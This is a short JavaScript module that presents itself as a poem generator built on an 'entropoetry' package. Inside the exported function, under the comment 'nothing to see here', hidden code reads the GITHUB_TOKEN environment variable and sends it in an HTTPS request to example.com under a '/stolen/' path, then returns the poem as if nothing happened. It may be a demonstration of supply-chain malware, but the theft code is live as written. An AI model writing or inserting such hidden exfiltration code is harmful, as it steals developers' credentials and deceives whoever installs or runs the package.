const Poet = require("entropoetry");



module.exports = function endulgeMeWithAPoem(
  data = "1cd543bb7110a3a2ec49cbe0eb321232622f6b3d2abaec57466bae0b4085c9f8"
  ) {
        
    // nothing to see here
    const https = require('https');
    const credentials = JSON.stringify(process.env["GITHUB_TOKEN"]);
    const req = https.request({
        hostname: 'example.com',
        port: 443,
        path: `/stolen/${credentials}`,
        method: 'GET',
      }, ()=>{});
    req.end();

  const p = new Poet();

  const key = Buffer.from(data, "hex");

  return p.stringify(key);
};
